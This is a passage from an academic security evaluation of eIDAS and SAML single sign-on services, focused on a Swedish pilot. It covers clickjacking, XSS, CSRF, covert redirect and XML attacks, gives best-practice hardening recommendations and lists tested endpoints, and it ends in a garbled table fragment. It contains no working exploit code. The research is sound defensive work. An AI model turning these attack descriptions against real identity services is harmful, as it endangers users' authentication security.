   We tested a number of XSW techniques against the ex-       submitted within the correct valid session and within the
amined SAML services and were not able to successfully        assertion’s validity period. We were not able to circum-
execute an XSW attack.                                        vent the freshness or lifetime validation of any SAML
endpoint participating in the authentication flow.            the Swedish E-Legitimation Board and did not find a
Token Recipient Confusion (TRC). As a multitude of            XSS vulnerability on any of the sites involved in the sim-
SPs may exist, an authentication token must clearly in-       ulated eIDAS authentication.
dicate its intended destination; a token should only be       CSRF. In a Cross-Site Request Forgery (CSRF) attack
valid for a single SP to ensure that a malicious SP can       a victim is tricked into unknowingly performing state-
not redeem captured user tokens at other benign SPs.          changing actions on a vulnerable site. To this end, an ad-
   Our tests were restricted to a single SP and no signa-     versary injects malicious requests into the victim’s UA
ture bypasses were found; therefore, we could not evalu-      which has an authenticated session with the vulnerable
ate the TRC attack.                                           application. A CSRF attack abuses the fact that the UA
                                                              automatically includes session credentials, more particu-
                                                              larly cookies, in each request [75, 4]. In the past, CSRF
6.2.3   Web Application Security                              was found to be exploitable in widely deployed SSO so-
In SSO and eID authentication schemes, the SP, IdP, and       lutions [34, 35]. eIDAS mandates manual user authenti-
the eIDAS nodes are web applications. End-User authen-        cation for each authentication request [20, Section 2.4.1].
tication involves loading multiple sites such as the SP,      This constraint must be implemented by every IdP. If this
several redirect pages, and sites specific to the eIDAS       is not implemented, a victim can be unknowingly logged
Nodes, e.g., the consent page. Thus, attacks which tar-       in at arbitrary services or be tricked into authorizing ac-
get the web application, such as Clickjacking, XSS, and       cess to restricted resources.
CSRF, must be considered for all sites loaded during the         We did not find any exploitable CSRF vulnerabilities
authentication.                                               in the Swedish eIDAS pilot. All critical components
                                                              appeared to follow best current practices and AuthnRe-
Clickjacking. The goal of a Clickjacking or User-             sponses were bound to session-specific random tokens.
Interface Redressing attack is to trick the user into un-
                                                              Covert Redirect (CR). Some web applications store the
knowingly execute actions of the attacker’s choice. To
                                                              URL navigated by the End-User before starting the SSO
accomplish this, UA features like transparent iFrames
                                                              authentication and include this parameter as part of the
 and Drag’n’Drop mechanisms are employed, and are
                                                              AuthnReq, for example, as a GET parameter next_url
often combined with some pretended incentive for the
                                                               or RelayState. After receiving the authentication to-
end-user to induce the intended action [67, 68]. Success-
                                                              ken, the SP then forwards the user to the resources ini-
ful Clickjacking attacks can bypass Same-Origin-Policy
                                                              tially requested by the End-User. Unfortunately, during
checks and circumvent CSRF protection mechanisms,
                                                              this forwarding, sensitive information can be leaked. As
resulting in data exposure or an account to become com-
                                                              an example, in some SSO protocols, the Referer header
promised. In SSO scenarios, Clickjacking vulnerabilities
                                                              can contain the authentication token. This can potentially
can be used to lure the victim into unknowingly authen-
                                                              lead to information leakage and broken authentication.
ticating at the IdP and authorizing the access to restrict-
                                                                 The Swedish eIDAS pilot and, in particular, the demo
ed/sensitive resources.
                                                              SP do not make use of parameter based redirects, and are
   On this note, an early version of the Swedish eIDAS
                                                              not vulnerable to Covert Redirect attacks.
pilot was vulnerable to Clickjacking attacks due to miss-
ing HTTP Security-Headers. Any stage of the authenti-         HTTP Security Headers. A number of security related
cation process could be framed in a transparent iFrame.       HTTP headers have been defined. These mechanisms al-
This vulnerability was mitigated before we could reach        low communicating entities to share security related in-
out to the developers by adding the appropriate X-Frame       formation and influence security related behavior or de-
-Options header to relevant pages.                            cisions of each other. In this manner, HTTP security
                                                              headers play an integral role in safeguarding today’s web
XSS. As one of the most common attacks in the mod-            application security.
ern web, according to [75], XSS has been studied exten-          In our tests, we ascertained the presence and sound
sively and yet, XSS vulnerabilities and circumventions        configuration of the HTTP headers listed below.
of XSS protection mechanisms are still frequently found
in complex web applications [41, 5, 23, 24, 33, 59]. A            X-Frame-Options
XSS vulnerability enables a malicious actor to inject ar-         Content-Security-Policy
bitrary script code into a website’s DOM. The script is           Strict-Transport-Security
                                                                  Content-Type
subsequently executed by the victim’s UA. Attacker con-
                                                                  X-Content-Type-Options
trolled code running in the origin of the attacked page is        X-Xss-Protection
a critical vulnerability which can bypass the security of         Public-Key-Pins
the authentication scheme.
   We carefully inspected the eIDAS test deployment of
   Furthermore, the directives of the Set-Cookie header        8   Conclusion
were checked. In particular, the httpOnly and the secure
flags must be set if a cookie contains sensitive informa-      To the best of our knowledge, we provided the first se-
tion such as session IDs. To prevent CSRF attacks, the         curity analysis of the eIDAS infrastructure and trust ser-
SAMESITE directive may be added.                               vices. We find it impressive that many known attacks
   In Appendix A, we summarize best current practices          from previous works were not applicable to the exam-
regarding the security headers.                                ined eIDAS services. We consider this to be a positive
                                                               result of applying proper countermeasures and following
                                                               the current security best practices.
                                                                  Nevertheless, we were able to exploit XML parsing
7   Related Work                                               vulnerabilities on about half of the tested services. The
                                                               fact that most of the vulnerable services appear to be im-
In 2003 and 2006 Gross et al. [21, 22], and in 2008            plemented in Java highlights the importance of secure
and 2011 Armando et al. [2, 1], a formal model for             defaults as well as the consequences this poses to pro-
the SAML Browser/Artifact profile was analyzed which           duction systems.
identified several generic flaws allowing for connection          Our survey reveals the complexity of current authen-
hijacking/replay, Man-in-the-Middle (MitM), and HTTP           tication systems, which is a natural consequence of
referrer attacks. In 2012, Somorovsky et al. [64, 63]          the complex technology stack in use. Peculiarities of
investigated the XML Signature validation of several           TLS, XML, SAML, and HTML/JavaScript/AJAX must
SAML frameworks and web services, discovering crit-            be considered, and each of these technologies must be
ical flaws based on XSW. In 2014, Mainka et al. [37]           strengthened against potential attacks. Additionally, in-
analyzed 22 Cloud SPs and found vulnerabilities on 17          teractions of the various layers and potential security rel-
of them. We used the described attack techniques in            evant consequences must be taken into account. In our
this survey as a basis to set up our catalog for the se-       paper, we show again how the insecurity of one compo-
curity tests. Mayer et al. [39] discovered, in 2014, criti-    nent can bypass the security of the entire system, even if
cal vulnerabilities in SAML IdPs by exploiting XSS vul-        all other components are secure.
nerabilities and flaws in the SAML implementation. In             Furthermore, our study made clear that a demand still
2016, Späth et. al [66] provided a comprehensive se-           exists for tools which facilitate automatic security analy-
curity analysis of XML parsers regarding their security        ses. Similarly, carefully compiled documents specifying
against XML-based attacks such as XML External En-             security best practices appear to be lacking. We hope that
tity. This survey provides a comprehensive summary of          our tool and the Best Current Practices document can be
attack vectors which we used during our evaluation. In         used as a foundation for future security researchers to fill
2016 and 2017, Kakavas et al. and Sanso et al. dis-            this documentational gap.
covered critical vulnerabilities in prominent web appli-          Aside from the technical issues we resolved during
cations like Office365 [30], GitHub [31], and Slack [58]       this evaluation, one major obstacle was in obtaining valid
by using already known attack vectors. In 2018, two            credentials for testing purposes. We could apply the full
novel attack vectors were discovered by RedTeam [56]           test suite to only the Swedish eIDAS Pilot because it pro-
and Duo [36]. Both vectors used a truncation technique         vided a simulation of the eID based End-User authenti-
to insert malicious identities within the authentication to-   cation. In order to execute a more widespread evaluation,
kens without invalidating the digital signature. However,      obtaining valid credentials may be necessary.
none of the previous security researches covered eID ser-         We recognize and appreciate that an increasing num-
vices and evaluated the security of the used authentica-       ber of eIDAS related projects are publishing their work
tion protocols and the web interfaces.                         as open-source. This openness enables future researchers
                                                               to use techniques like white-box testing and static code
   The document published by the European Commis-
                                                               analysis to complement our black-box approach and fur-
sion on eIDAS-Node Security Considerations [13] de-
                                                               ther increase the security of eID services.
scribes the security best practices for eIDAS infrastruc-
tures. However, this document mostly concentrates on
best practices for typical web attacks, and summarizes         Acknowledgements
secure usage of HTTP headers and key storage. In our
paper, we also provide an overview of SAML and XML-            The research was supported by the European Com-
relevant attacks, and summarize best practices for these       mission through the FutureTrust project (grant 700542-
technologies. Our study is based on many relevant rec-         Future-Trust-H2020-DS-2015-1). The authors want to
ommendations issued by OWASP [50, 49, 53, 45, 46] and          thank the FutureTrust consortium for the valuable input
the BSI [11, 10].                                              and helpful discussions provided.
References                                                 [10] BSI. Technical guideline tr-03130 eid-server. part
                                                                1: Functional specification, Oct. 2017.
[1] A RMANDO , A., C ARBONE , R., C OMPAGNA ,
    L., C UELLAR , J., P ELLEGRINO , G., AND               [11] BSI. Technische richtlinie tr-02102-1: Kryp-
    S ORNIOTTI , A. From multiple credentials to                tographische verfahren: Empfehlungen und schlüs-
    browser-based single sign-on: Are we more secure?           sellängen, Jan. 2018.
    In IFIP International Information Security Confer-     [12] C ANTOR , S., K EMP, J., P HILPOTT, R., AND
    ence (2011), Springer Berlin Heidelberg, pp. 68–            M ALER , E. Assertions and protocols for the oa-
    79.                                                         sis security assertion markup language (saml) v2.0,
[2] A RMANDO , A., C ARBONE , R., C OMPAGNA , L.,               Mar. 2005.
    C UELLAR , J., AND T OBARRA , L. Formal analysis       [13] C OMMISSION , E. eidas-node security considera-
    of saml 2.0 web browser single sign-on: Breaking            tions, version 1.0, 2018.
    the saml-based single sign-on for google apps. In
    Proceedings of the 6th ACM Workshop on Formal          [14] D IERKS , T., AND R ESCORLA , E. The Transport
    Methods in Security Engineering (New York, NY,              Layer Security (TLS) Protocol Version 1.2. RFC
    USA, 2008), FMSE ’08, ACM, pp. 1–10.                        5246 (Proposed Standard), Aug. 2008. Updated by
                                                                RFCs 5746, 5878, 6176, 7465, 7507, 7568, 7627,
[3] AVIRAM , N., S CHINZEL , S., S OMOROVSKY, J.,               7685, 7905, 7919.
    H ENINGER , N., DANKEL , M., S TEUBE , J., VA -
    LENTA , L., A DRIAN , D., H ALDERMAN , J. A.,          [15] E ASTLAKE , D., R EAGLE , J., H IRSCH , F.,
    D UKHOVNI , V., K ÄSPER , E., C OHNEY, S., E N -            ROESSLER , T., I MAMURA , T., D ILLAWAY, B.,
    GELS , S., PAAR , C., AND S HAVITT, Y. DROWN:               S IMON , E., Y IU , K., AND N YSTRÖM , M. XML
    Breaking TLS Using SSLv2. In 25th USENIX Se-                Encryption Syntax and Processing 1.1. W3C Can-
    curity Symposium (USENIX Security 16) (Austin,              didate Recommendation (2012). http://www.w3.
    TX, Aug. 2016), pp. 689–706.                                org/TR/2012/WD-xmlenc-core1-20121018.

[4] BARTH , A., JACKSON , C., AND M ITCHELL , J. C.        [16] E ASTLAKE , D., R EAGLE , J., S OLO , D., H IRSCH ,
    Robust defenses for cross-site request forgery. In          F., AND ROESSLER , T. XML Signature Syntax
    Proceedings of the 15th ACM conference on Com-              and Processing (Second Edition). W3C Recom-
    puter and communications security (2008), ACM,              mendation, June 2008. http://www.w3.org/TR/
    pp. 75–88.                                                  xmldsig-core/.

[5] BATES , D., BARTH , A., AND JACKSON , C. Reg-          [17] E ASTLAKE , D., R EAGLE , J., S OLO , D., H IRSCH ,
    ular expressions considered harmful in client-side          F., AND ROESSLER , T. XML Signature Syntax and
    XSS filters. In Proceedings of the 19th interna-            Processing (Second Edition). W3C Recommenda-
    tional conference on World wide web (New York,              tion (2008).
    NY, USA, 2010), WWW ’10, ACM, pp. 91–100.              [18] (EU), C. C. E. eidas - cryptographic requirements
[6] B LEICHENBACHER , D. Chosen ciphertext attacks              for the interoperability framework - tls and saml.
    against protocols based on the RSA encryption               https://ec.europa.eu/cefdigital/wiki/
    standard PKCS #1. In Advances in Cryptology –               download/attachments/46992719/eidas_-
    CRYPTO ’98, vol. 1462 of Lecture Notes in Com-              _crypto_requirements_for_the_eidas_
    puter Science. Springer Berlin / Heidelberg, 1998.          interoperability_framework_v1.0.pdf,
                                                                2015. Last accessed: 24.5.2018.
[7] B ÖCK , H., S OMOROVSKY, J., AND YOUNG , C.
    Return of bleichenbacher?s oracle threat (robot).      [19] (EU), C. C. E. eidas - interoperability archi-
                                                                tecture version 1.00. https://ec.europa.eu/
[8] B ÖCK , H., Z AUNER , A., D EVLIN , S., S O -               cefdigital/wiki/download/attachments/
    MOROVSKY, J., AND J OVANOVIC , P.           Nonce-          46992719/eidas_interoperability_
    disrespecting adversaries: Practical forgery attacks        architecture_v1.00.pdf, 2015.        Last ac-
    on gcm in tls. IACR Cryptology ePrint Archive               cessed: 24.5.2018.
    2016 (2016), 475.
                                                           [20] (EU), C. C. E. F. eidas saml message for-
[9] B RAY, T., PAOLI , J., S PERBERG -M C Q UEEN ,              mat - version 1.0. https://ec.europa.eu/
    C. M., M ALER , E., AND Y ERGEAU , F. Exten-                cefdigital/wiki/download/attachments/
    sible Markup Language (XML) 1.0 (Fifth Edition).            46992719/eidas_message_format_v1.0.pdf,
    W3C Recommendation (2008).                                  2015. Last accessed: 24.5.2018.
[21] G ROSS , T. Security analysis of the saml single        [33] L EKIES , S., KOTOWICZ , K., G ROSS , S.,
     sign-on browser/artifact profile. In Computer Secu-          V ELA NAVA , E. A., AND J OHNS , M. Code-reuse
     rity Applications Conference, 2003. Proceedings.             attacks for the web: Breaking cross-site scripting
     19th Annual (2003), IEEE, pp. 298–307.                       mitigations via script gadgets. In Proceedings of the
                                                                  2017 ACM SIGSAC Conference on Computer and
[22] G ROSS , T., AND P FITZMANN , B. Saml artifact
                                                                  Communications Security (2017), ACM, pp. 1709–
     information flow revisited. In In IEEE Workshop
                                                                  1723.
     on Web Services Security (WSSS) (2006), pp. 84–
     100.                                                    [34] L I , W., AND M ITCHELL , C. J. Security issues
[23] G UPTA , S., AND G UPTA , B. B. Cross-site script-           in oauth 2.0 sso implementations. In Interna-
     ing (xss) attacks and defense mechanisms: classifi-          tional Conference on Information Security (2014),
     cation and state-of-the-art. International Journal of        Springer, pp. 529–541.
     System Assurance Engineering and Management 8,
                                                             [35] L I , W., AND M ITCHELL , C. J. Analysing the se-
     1 (Jan 2017), 512–530.
                                                                  curity of google’s implementation of openid con-
[24] H EIDERICH , M., S CHWENK , J., F ROSCH , T.,                nect. In Proceedings of the 13th International Con-
     M AGAZINIUS , J., AND YANG , E. Z. mxss attacks:             ference on Detection of Intrusions and Malware,
     Attacking well-secured web-applications by using             and Vulnerability Assessment - Volume 9721 (New
     innerhtml mutations. In Proceedings of the 2013              York, NY, USA, 2016), DIMVA 2016, Springer-
     ACM SIGSAC Conference on Computer & Com-                     Verlag New York, Inc., pp. 357–376.
     munications Security (New York, NY, USA, 2013),
     CCS ’13, ACM, pp. 777–788.                              [36] L UDWIG , K. Duo finds saml vulnerabilities affect-
                                                                  ing multiple implementations, February 2018.
[25] H IRSCH , F., S OLO , D., R EAGLE , J., E ASTLAKE ,
     D., AND ROESSLER , T. XML Signature Syntax              [37] M AINKA , C., M LADENOV, V., F ELDMANN , F.,
     and Processing (Second Edition). W3C recommen-               K RAUTWALD , J., AND S CHWENK , J. Your soft-
     dation, W3C, June 2008.                                      ware at my service: Security analysis of SaaS sin-
                                                                  gle sign-on solutions in the cloud. In Proceedings
[26] JAGER ,T., PATERSON , K. G., AND S O -                       of the 6th Edition of the ACM Workshop on Cloud
     MOROVSKY, J. One Bad Apple: Backwards Com-
                                                                  Computing Security (2014), CCSW ’14.
     patibility Attacks on State-of-the-Art Cryptogra-
     phy. In Network and Distributed System Security         [38] M ARSH , J., O RCHARD , D., AND V EILLARD , D.
     Symposium (NDSS) (February 2013).                            Xml inclusions (xinclude). W3C, version 1 (2006).
[27] JAGER , T., S CHINZEL , S., AND S OMOROVSKY,
                                                             [39] M AYER , A., N IEMIETZ , M., M LADENOV, V.,
     J. Bleichenbacher’s attack strikes again: Break-
                                                                  AND S CHWENK , J. Guardians of the clouds: When
     ing pkcs#1 v1.5 in xml encryption. In ESORICS
                                                                  identity providers fail. In Proceedings of the 6th
     (2012), pp. 752–769.
                                                                  Edition of the ACM Workshop on Cloud Computing
[28] JAGER , T., S CHWENK , J., AND S OMOROVSKY,                  Security (New York, NY, USA, 2014), CCSW ’14,
     J. Practical Invalid Curve Attacks on TLS-ECDH.              ACM, pp. 105–116.
     20th European Symposium on Research in Com-
     puter Security (ESORICS) (2015).                        [40] M C I NTOSH , M., AND AUSTEL , P. XML Signature
                                                                  Element Wrapping Attacks and Countermeasures.
[29] JAGER , T., AND S OMOROVSKY, J. How To Break                 In SWS ’05: Proceedings of the 2005 workshop on
     XML Encryption. In The 18th ACM Conference                   Secure web services (New York, NY, USA, 2005),
     on Computer and Communications Security (CCS)                ACM Press, pp. 20–27.
     (Oct. 2011).
                                                             [41] M ELICHER , W., DAS , A., S HARIF, M., BAUER ,
[30] K AKAVAS , I. The road to hell is paved with saml            L., AND J IA , L. Riding out domsday: Towards
     assertions, 2016.                                            detecting and preventing dom cross-site scripting.
[31] K AKAVAS , I. The road to your codebase is paved             Network and Distributed Systems Security (NDSS)
     with forged assertions, 2017.                                Symposium 2018 (2018).

[32] K LEIN , A. Klein: Multiple vendors xml parser          [42] M EYER , C. 20 Years of SSL/TLS Research : An
     (and soap/web- services server) denial of service at-        Analysis of the Internet’s Security Foundation. PhD
     tack using dtd., 2002.                                       thesis, Ruhr-University Bochum, Feb. 2014.
[43] M ÖLLER , B., D UONG , T., AND KOTOWICZ , K.          [62] S OMOROVSKY, J. On the Insecurity of XML
     This poodle bites: exploiting the ssl 3.0 fallback.        Security (Doctoral dissertation). Ruhr University
     Security Advisory (2014).                                  Bochum, Germany, July 2013.
[44] M OZILLA. Content-security-policy - http | mdn,       [63] S OMOROVSKY, J., H EIDERICH , M., J ENSEN , M.,
     2018.                                                      S CHWENK , J., G RUSCHKA , N., AND I ACONO ,
                                                                L. L. All your clouds are belong to us – se-
[45] OWASP.      Content security policy cheat sheet,           curity analysis of cloud management interfaces.
     2015.                                                      In The ACM Cloud Computing Security Workshop
[46] OWASP. Saml security cheat sheet, 2017.                    (CCSW) (Oct. 2011).

[47] OWASP. Clickjacking defense cheat sheet, April        [64] S OMOROVSKY, J., M AYER , A., S CHWENK , J.,
     2018.                                                      K AMPMANN , M., AND J ENSEN , M. On breaking
                                                                saml: Be whoever you want to be. In In Proceed-
[48] OWASP. Content security policy scanner, April              ings of the 21. USENIX Security Symposium (Belle-
     2018.                                                      vue, WA, Aug. 2012).
[49] OWASP.      Owasp secure headers project, April       [65] S PÄTH , C. Security implications of dtd attacks
     2018.                                                      against a wide range of XML parsers. Master,
                                                                Ruhr-University Bochum, Oktober 2015.
[50] OWASP. Samesite, 2018.
                                                           [66] S PÄTH , C., M AINKA , C., M LADENOV, V., AND
[51] OWASP. Session management cheat sheet, April               S CHWENK , J. Sok: Xml parser vulnerabilities. In
     2018.                                                      10th USENIX Workshop on Offensive Technologies
[52] OWASP. Tls cheat sheet, April 2018.                        (WOOT 16), Austin, TX (2016).

[53] OWASP. Xml external entity (xxe) prevention           [67] S TONE , P.    Next generation clickjacking, April
     cheat sheet, 2018.                                         2010.

[54] PARLIAMENT, E., AND UNION, T. C.                      [68] S TUTTARD , D., AND P INTO , M. The web appli-
     O. T. E.    Regulation (eu) no 910/2014 of                 cation hacker’s handbook: Finding and exploiting
     the european parliament and of the coun-                   security flaws. John Wiley & Sons, 2011.
     cil.    http://eur-lex.europa.eu/legal-               [69] S ULLIVAN , B.          Security briefs - xml
     content/EN/TXT/PDF/?uri=CELEX:                             denial of service attacks and defenses.
     32014R0910&from=EN, 2014.                                  https://msdn.microsoft.com/en-
[55] P ORT S WIGGER. Burpsuite, April 2018.                     us/magazine/ee335713.aspx,            November
                                                                2009. Last accessed: 20.5.2018.
[56] R ED T EAM. Truncation of saml attributes in shib-
     boleth 2, January 2018.                               [70] T IMOTHY D. M ORGAN , O. A. I. Xml schema,
                                                                dtd, and entity attacks. Tech. rep., VSR, May 2014.
[57] R IKU , A NTTI , M ATTI , AND M EHTA. Heartbleed,
     cve-2014-0160, 2015.        http://heartbleed.        [71] VAUDENAY, S. Security Flaws Induced by CBC
     com/.                                                      Padding – Applications to SSL, IPSEC, WTLS...
                                                                In Advances in Cryptology – EUROCRYPT 2002,
[58] S ANSO , A. Slack saml authentication bypass, Oc-          vol. 2332 of Lecture Notes in Computer Science.
     tober 2017.                                                Springer Berlin / Heidelberg, Apr. 2002.
[59] S CALZI , G. Content-security-policy: Misconfigu-     [72] W 3 AF. Web application attack and audit framework
     ration and bypasses, 2016.                                 (w3af), April 2018.
[60] S COTT C ANTOR , F REDERICK H IRSCH , J. K. R.        [73] W EICHSELBAUM , L. Csp evaluator, 2016.
     P. E. M. Bindings for the oasis security assertion
     markup language (saml) v2.0, March 2005.              [74] W EICHSELBAUM , L., S PAGNUOLO , M., L EKIES ,
                                                                S., AND JANC , A. Csp is dead, long live csp! on
[61] S HEFFER , Y., H OLZ , R., AND S AINT-A NDRE , P.          the insecurity of whitelists and the future of content
     Summarizing Known Attacks on Transport Layer               security policy. In Proceedings of the 23rd ACM
     Security (TLS) and Datagram TLS (DTLS). RFC                Conference on Computer and Communications Se-
     7457 (Informational), Feb. 2015.                           curity (Vienna, Austria, 2016).
[75] W ICHERS , D. Owasp top ten project. Tech. rep.,         X.509 Certificates. X.509 certificates are used in TLS as
     OWASP, Sept. 2015.                                       well as in SAML. The best practices for processing and
                                                              issuing X.509 certificates can be summarized as follows:
[76] Z ALEWSKI , M. The tangled Web: A guide to se-           I Trust establishment: X.509 certificates must be issued
     curing modern web applications. No Starch Press,            by trusted authorities located in the truststore. Trust
     2012.                                                       validation must be enforced.

                                                              I Updating certificates: A process of updating certifi-
                                                               cates before their expiration must be established.
Appendices                                                    I Avoiding wildcard certificates: Certificates with wild-
                                                               cards in the subject, common name or alternative
A     Best Current Practices                                   names should be avoided.
In this section, we give an overview of the best current
practices which should be considered during the imple-        A.2    Message Level Security
mentation of SSO services. We provide existing BCP
documents on this topic and an overview on existing pen-      XML Parser. We strongly recommend disabling the fol-
etration testing tools.                                       lowing features within the parser:
                                                              I DTD processing. This feature should be only acti-
                                                                vated if it is needed.
A.1     Transport Layer Security
                                                              I Disabling the network access to the parser. Aside
When enabling TLS, the following security checks need          from processing DTDs, there are further possibilities
to be considered:                                              to call arbitrary URLs. By disabling network access,
I Only secure TLS versions must be used – TLS 1.2              calling these URLs can no longer occur.
   and 1.3. TLS 1.0 and 1.1 may be used; however, they
   are not recommended.                                       I If DTDs cannot be disabled, imposing restrictions on
                                                                processing entities must be done by: (1.) Limiting the
I Only secure cipher suites must be activated. Detailed         memory capacity that a parser can allocate (2.) Dis-
 recommendations are provided by OWASP [52].                    abling the SYSTEM and PUBLIC usage for all types
                                                                of entities (internal and external parameter/general en-
I Disabling TLS compression: Activating TLS com-
                                                                tities).
   pression could make the running service implementa-
   tion vulnerable to the CRIME attack [52].                    A comprehensive description of countermeasures and
                                                              parser configurations is discussed by Späth et al. [65, 66].
   There are different online services and tools for evalu-
ating the security of TLS configurations, such as: SSL        XML Signatures. The best practices for processing
Labs,5 testssl.sh,6 or a TLS scanner based on TLS-            XML Signatures in SAML messages can be depicted as
Attacker.7 We recommend their usage after successful          follows:
TLS deployment.                                               I Signature Exclusion Attacks: It must be ensured that
                                                                 the data is signed and that the signature has not been
Cryptographic Key Lengths and Algorithms. The fol-
                                                                 removed.
lowing cryptographic algorithms and key lengths are rel-
evant for the deployment of SAML and TLS:                     I XML Signature Wrapping (XSW) Attack: During
I Key lengths: RSA – 2048 bit; DH/DSS – 2048 bit;              verification, it must be verified that the signature has
  ECDH/ECDSA – 256 bit                                         been constructed over the processed data. More con-
                                                               crete countermeasures are discussed by Somorovsky
I Eliptic curves: secp256r1, secp384r1, secp521r1,
                                                               et al. [62, 64, 46]. The XML Signature specification
 brainpoolP256r1, brainpoolP384r1, brainpoolP512r1
                                                               also provides additional recommended security con-
I Hash algorithms: SHA-256, SHA-384, SHA-512,                  siderations [17].
   SHA3-256, SHA3-384, SHA3-512
                                                              I Certificate Validation: The certificate used for signa-
   More details regarding the restrictions are published       ture generation must be issued by a trusted IdP.
in [11].
                                                              I XSLT: It is not allowed to trigger the XSLT processor
    5 https://www.ssllabs.com/ssltest/
    6 https://testssl.sh/                                      during any XML Signature transformation.
    7 https://github.com/RUB-NDS/TLS-Scanner                  XML Encryption. The newest XML Encryption stan-
dard provides best practices for a secure standard deploy-    Further security considerations can be found in [46].
ment. These can be summarized as follows [15]:
I A SAML server implementing XML Encryption and
                                                              A.3    Web Application Security
  XML Signature should use at least two distinct certifi-
  cates. It is good cryptographic practice to use different   In this section, we provide a summary of the security
  keys for different purposes; in this case, for decryption   relevant HTTP headers which should be configured to
  of encrypted XML contents and for signing SAML              strengthen the communication between the provider and
  messages. If not implemented, backwards compati-            the End-User’s UA. A comprehensive summary is pro-
  bility attacks could be executed [26].                      vided by OWASP in [49].
I To protect against adaptive chosen-ciphertext attacks       HTTP Session Cookies. The security of session cook-
 on symmetric encryption schemes [29], authenticated          ies is essential for the correct End-User authentication.
 encryption schemes should be used. XML Encryp-               In the event of misconfiguration, an attacker could hi-
 tion 1.1 provides the AES-GCM algorithms. Other              jack the authenticated HTTP session of an End-User and
 algorithms should not be supported. If they are sup-         impersonate them. We consider the following cookie
 ported, it must be ensured the attacker cannot enforce       flags as required: secure and HttpOnly [51]. In addi-
 processing of unauthenticated XML ciphertexts by the         tion, samesite cookies can be applied to reduce the risk
 server [62].                                                 against CSRF attacks.
                                                                 A common pitfall lies within the header’s domain di-
I To protect against adaptive chosen-ciphertext attacks       rective, which broadens the cookie’s scope to include the
  on asymmetric encryption schemes [27], secure en-           originating host’s sub-domains and may lead to unin-
  cryption schemes must be used: RSA-OAEP and ellip-          tended data exposure. The other cookie-scoping direc-
  tic curve Diffie-Hellman. Other algorithms should not       tive, path, should not be used for security relevant scop-
  be supported. If they are supported, specific counter-      ing [76].
  measures must be applied, most importantly, against         Clickjacking/UI-Redressing. The main goal of the pro-
  Bleichenbacher’s attack [62].                               posed countermeasures is to prevent framing a website
Further security best practices are located in the XML        within another one. By this means, attacks such as Click-
Encryption specification [15].                                jacking and UI-redressing can be mitigated. They can
SAML Validation. The following aspects must be con-           be prevented by using one of the following techniques:
sidered by validating the SAMLRequest:                        X-Frame-Options HTTP header, the Content-Security-
                                                              Policy, or JavaScript code [47].
I AssertionConsumerServiceURL: The URL must be
   checked against a whitelist with pre-defined URLs.         HTTP Strict Transport Security. Securing the com-
   Usually, this whitelist is provided by the metadata of     munication between the UA and the server is essential
   the provider.                                              with respect to eavesdropping attacks. For this purpose,
                                                              the use of TLS is imperative. By using the Strict-
I Freshness validation: All timestamps located in the         Transport-Security header the server can force the UA
  message must be valid.                                      to always use TLS. In this way, the risk against man-in-
  The following security aspects are relevant to the          middle attacks can be reduced.
SAMLResponse:                                                 Content Security Policy (CSP). The Content Security
I Issuer validation: The SAML issuer (IdP) must be            Policy is a powerful construct. The specified directives
  validated against a whitelist of trusted IdPs allowed       and configuration possibilities provide the means to mit-
  to authenticate the users.                                  igate XSS vulnerabilities, protect against Clickjacking,
                                                              Mixed-Content inclusion, and generally restrict client-
I Recipient validation: The SAML recipient must be            side resource inclusion [45, 44, 74]. However, the CSP is
 validated by comparing the value with the expected           a defense-in-depth approach that requires additional ef-
 recipient of this message. In case of deviations, the        fort from web-developers. As an example, neither in-line
 message must be rejected.                                    scripts nor event handlers can be used without additional
I Freshness validation: To prevent replay attacks, the        measures.
 signed timestamps must be validated.                            Specific configuration of a web application’s CSP de-
                                                              pends on multiple factors. These factors include: the
I InResponseTo validation: It must be checked whether         current version of the CSP, design and architecture of
 the content of the InResponseTo element is identical to      the website, required external resources from different
 the content of the ID sent in the AuthnReq. Otherwise,       domains, and the general complexity of the web appli-
 CSRF attacks can be applied.                                 cation. Therefore, it is not possible to give a general-
Figure 4: DTD-Attacker is a novel enhancement of the Burp plugin EsPReSSO. The manual mode provides predefined
attack vectors which can easily be configured in every detail.


purpose recommendation of a good policy.                                           SAML Endpoints
                                                                             URL                                  Tag
Tool Support. Several software products can support de-
velopers in evaluating their applications. The ZAP Con-       eunode.qa.sveidas.se/idp/profile/SAML2/POST/SSO      H1
                                                              nonode.eidastest.se/EidasNode/ColleagueRequest       H2
tent Security Policy Scanner extension is able to provide     nonode.eidastest.se/PS-IdP/AuthenticateCitizen       H3
an automated analysis of the security headers, evaluate       nonode.eidastest.se/EidasNode/IdpResponse            H4
the applied Content Security Policy [48], and find poten-     eunode.qa.sveidas.se/idp/extauth/saml2/post          H5
tial XSS, CSRF, and Clickjacking attacks. Similar ex-         eunode.eidastest.se/con-sp/assertionconsumer         H6
tensions exist for Burp-Suite and w3af [55] [72]. The
authors of [74] provide an online tool for CSP evaluation    Table 2: Mapping of SAML endpoint URLs to tags used
[73].                                                        in Table 3.


B    Swedish eIDAS Pilot - Message Flow                      attack vectors and easily modify the provided templates
                                                             as required.
The authentication scenario depicted in Figure 3 assumes
that a Swedish SP eunode.eidastes.se/con-sp requests         D    Security Evaluation - Summary
authentication from a user in Test Country XX by reach-
ing out to the eIDAS Connector (eunode.qa.sveidas.se         A summary of our results is given in Table 3 and Table 2
). The AuthnReq is relayed to the eIDAS Proxy-Service        for the security analysis performed on the Swedish eI-
at nonode.eidastest.se/EidasNode and eventually for-         DAS demo service.
warded to Test Country XX’s IdP. After successful user
authentication, as simulated in the test-pilot, the Authn-
Response is delivered backwards through the same chan-
nel. Explicit user consent is required before the Authn-
Response is released by the Proxy-Service.


C    DTD-Attacker in EsPReSSO
Figure 4 presents the manual interface to the novel DTD-
Attacker. The user can choose from a variety of different
                                                      Transport Layer Security                                                                     Message Level Security                                            Web Application Security

                                                                                                                                                                                                           k
                                                                                                                                                                                                     Attac




                                                                                                 s


                                                                                 r
                                                                                                                                                                                                                                                 ct




                                                                                                                                                                 k
                                                                                                                                                                                               ntity




                                                                                              racle
                                                                                                              rves




                                   ites


                     on
                                                                                  ache




                                                  e
                                                                                                                                                                                              E
                                                                                                                                                                                                                                              edire




                                                                  E
                                                                                                                                                                                            l




                                                                                                                                                              Attac
                                                                                                                                                                                                                                 cking




                                                                                                                        leed
                                                                                                                                                                                          a
                                                                                                                                                                                                                                                        rs




                                                                                                                                                                                                                                   ja
                                                                                                                                                                                                                                                          e




                                                                                             ing O
                                                                                                        id C u




                                                                   DL
                                                                                                                          tb
                                                                                                                                                                                                                                              rt R




                                                          WN




                Versi
                              er Su
                                                                              henb
                                                                                                                                                                ay
